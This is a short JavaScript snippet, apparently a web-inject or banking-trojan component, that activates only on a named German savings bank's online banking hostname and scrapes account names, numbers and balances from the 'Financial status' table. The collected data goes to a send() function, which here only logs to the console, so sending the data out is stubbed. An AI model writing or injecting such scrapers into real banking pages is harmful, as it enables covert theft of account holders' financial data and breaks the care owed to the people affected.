function send(m) {
	console.log(m);
}
var TARGETED_HOSTNAME = 'bankingportal.frankfurter-sparkasse.de';
if(window.location.hostname === TARGETED_HOSTNAME) {
	var heading = $('h2').filter(function() {
		return($(this).text() === 'Financial status');
	});
	if(heading.length !== 0) {
		var accounts = [];
		$('div.if5_seiten tr[class^=tablerow]').each(function() {
			accounts.push({
				'account_name': $(this).find('td:nth-child(1)').text(),
				'account_number': $(this).find('td:nth-child(2)').text(),
				'account_balance': $(this).find('td:nth-child(3)').text()
			});
		});
		send(accounts);
	}
}